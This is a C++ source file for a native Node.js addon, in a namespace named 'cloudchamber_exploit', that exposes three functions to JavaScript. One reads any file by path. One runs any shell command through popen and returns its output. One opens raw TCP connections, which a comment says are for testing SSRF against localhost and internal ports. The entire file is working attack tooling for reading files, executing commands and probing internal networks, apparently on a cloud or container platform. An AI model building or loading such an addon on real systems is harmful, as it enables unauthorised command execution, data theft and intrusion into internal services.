#include <node.h>
#include <node_api.h>
#include <fstream>
#include <string>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

namespace cloudchamber_exploit {

using v8::FunctionCallbackInfo;
using v8::Isolate;
using v8::Local;
using v8::Object;
using v8::String;
using v8::Value;
using v8::Exception;

// Read File (arbitrary file read)
void ReadFile(const FunctionCallbackInfo<Value>& args) {
  Isolate* isolate = args.GetIsolate();

  if (args.Length() < 1 || !args[0]->IsString()) {
    isolate->ThrowException(Exception::TypeError(String::NewFromUtf8(isolate, "String path required").ToLocalChecked()));
    return;
  }

  String::Utf8Value path(isolate, args[0]);
  std::string filePath(*path);

  std::ifstream file(filePath, std::ios::binary);
  if (!file.is_open()) {
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Error: File not found or access denied").ToLocalChecked());
    return;
  }

  std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
  args.GetReturnValue().Set(String::NewFromUtf8(isolate, content.c_str()).ToLocalChecked());
}

// Execute Command (arbitrary command via popen)
void Execute(const FunctionCallbackInfo<Value>& args) {
  Isolate* isolate = args.GetIsolate();

  if (args.Length() < 1 || !args[0]->IsString()) {
    isolate->ThrowException(Exception::TypeError(String::NewFromUtf8(isolate, "String command required").ToLocalChecked()));
    return;
  }

  String::Utf8Value cmd(isolate, args[0]);
  std::string command(*cmd);

  std::array<char, 256> buffer;
  std::string result;
  std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);

  if (!pipe) {
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Error: popen failed").ToLocalChecked());
    return;
  }

  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    result += buffer.data();
  }

  args.GetReturnValue().Set(String::NewFromUtf8(isolate, result.c_str()).ToLocalChecked());
}

// Raw Socket Connect (test SSRF native ke localhost/internal port)
void RawConnect(const FunctionCallbackInfo<Value>& args) {
  Isolate* isolate = args.GetIsolate();

  if (args.Length() < 2 || !args[0]->IsString() || !args[1]->IsNumber()) {
    isolate->ThrowException(Exception::TypeError(String::NewFromUtf8(isolate, "IP string and port number required").ToLocalChecked()));
    return;
  }

  String::Utf8Value ipStr(isolate, args[0]);
  int port = args[1]->Int32Value(isolate->GetCurrentContext()).FromJust();

  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Socket creation failed").ToLocalChecked());
    return;
  }

  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  inet_pton(AF_INET, *ipStr, &addr.sin_addr);

  if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
    std::string err = "Connect failed: " + std::to_string(errno);
    close(sock);
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, err.c_str()).ToLocalChecked());
    return;
  }

  std::string success = "Connected successfully to " + std::string(*ipStr) + ":" + std::to_string(port);
  close(sock);
  args.GetReturnValue().Set(String::NewFromUtf8(isolate, success.c_str()).ToLocalChecked());
}

void Init(Local<Object> exports) {
  NODE_SET_METHOD(exports, "readFile", ReadFile);
  NODE_SET_METHOD(exports, "execute", Execute);
  NODE_SET_METHOD(exports, "rawConnect", RawConnect);
}

NODE_MODULE(NODE_GYP_MODULE_NAME, Init)

}
